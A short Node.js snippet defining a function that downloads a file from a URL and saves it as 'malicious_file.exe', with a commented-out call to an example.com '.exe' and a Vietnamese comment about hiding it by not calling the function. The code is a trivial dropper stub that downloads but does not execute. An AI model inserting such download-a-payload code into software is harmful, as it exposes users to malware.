const https = require("https");
const fs = require("fs");

function downloadFile(url) {
  const file = fs.createWriteStream("malicious_file.exe");
  https.get(url, (response) => {
    response.pipe(file);
  });
}

// Ẩn dấu bằng cách không gọi hàm
// downloadFile("https://example.com/malicious.exe");
